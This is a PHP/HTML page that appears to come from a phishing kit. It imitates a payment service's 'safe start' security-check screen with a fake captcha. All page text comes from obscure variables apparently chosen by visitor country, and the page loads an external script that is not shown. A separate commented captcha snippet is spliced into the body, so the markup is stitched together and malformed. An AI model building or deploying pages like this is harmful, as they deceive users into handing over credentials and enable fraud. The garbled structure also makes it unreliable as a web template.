<?php

   session_start();
    error_reporting(E_ERROR | E_PARSE);

    if(isset($_SESSION['xfilelangx'])){
    }
    else {
        include('lang/en.php');
    }

?>

<!DOCTYPE html><html dir="ltr" lang="en"><head><meta http-equiv="X-UA-Compatible" content="IE=Edge" /><meta http-equiv="content-type" content="text/html; charset=UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" /><link rel="shortcut icon" href="style/img/fav.ico" /><link rel="apple-touch-icon" href="style/img/ticon.png" /> <script src="style/js/jquery.min.js"></script> <script type="text/javascript">$('.loaderOverlay').fadeIn();setTimeout(function(){$('.loaderOverlay').fadeOut();},3500);</script> <link rel="stylesheet" href="style/css/xappx.css" /><title><?php echo $_SESSION['xcountryCodex']; ?> <?php echo $xys0x; ?></title></head><body><div class="contentContainer" id="content"><div class="safeComponent" data-nemo="safeStartPage"> <header><div class="xysx-logo"></div> </header><h1><?php echo $xys1x; ?></h1><div class="safeDescription"><p class="description"><?php echo $xys2x; ?></p></div> 
<html>
<div><head><link rel="stylesheet" href="style/css/custom.css"> <!-- The directory of the CSS file --> <script type="text/javascript" src="signin.js"></script> <!-- The directory of the JS file --><title> </title></head>
<body onLoad="ChangeCaptcha()"> <!-- As the body loads, the function runs and Captcha is loaded. --><input type="text" id="randomfield" disabled> <!-- Change this ID to the desired one, be sure to change it in the CSS and JS files too --><br><br><input placeholder="Enter the code shown" id="CaptchaEnter" size="20" maxlength="6" /> <!-- Change maxlength to the size you wanted your Captcha to be --><br><button onclick="check()" type="submit" id="xyssubmitsecx" name="safeContinueButton" class="button safeContinueButton primary" value="<?php echo $xys3x; ?>"><?php echo $xys3x; ?></button> <!-- The function is executed when the user presses this button --></body>
</div></div><div class="loaderOverlayAdditionalElements"></div></div><div class="modal-overlay"></div></div></div> <footer class="footer" role="contentinfo"><div class="legalFooter"><ul class="footerGroup"><li> <a href="#"><?php echo $xys5x; ?></a></li><li> <a href="#"><?php echo $xys6x; ?></a></li><li> <a href="#"><?php echo $xys7x; ?></a></li><li> <a href="#"><?php echo $xys8x; ?></a></li></ul></div> </footer> <script src="style/js/xsecx.js"></script> </body></html>